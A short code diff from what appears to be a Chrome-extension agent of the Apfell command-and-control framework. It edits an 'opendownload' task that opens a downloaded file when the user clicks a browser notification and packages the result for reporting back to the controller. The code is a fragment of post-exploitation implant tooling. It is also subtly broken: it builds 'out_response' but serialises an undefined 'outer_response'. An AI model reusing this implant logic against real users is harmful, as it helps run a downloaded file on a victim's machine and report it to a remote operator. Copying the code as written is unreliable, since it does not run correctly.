@@ -11,7 +11,7 @@ opendownload = function(task) {
         chrome.notifications.onButtonClicked.addListener(function(notificationIDa, bIndex) {
             if(notificationID === notificationIDa) {
                 chrome.downloads.open(id);
-                let response = {'task_id':task.task_id, 'completed': true, 'user_output': 'opened download with ID: ' + id};
+                let response = {'task_id':task.id, 'completed': true, 'user_output': 'opened download with ID: ' + id};
                 let out_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
                 let enc = JSON.stringify(outer_response);
                 let final = apfell.apfellid + enc;
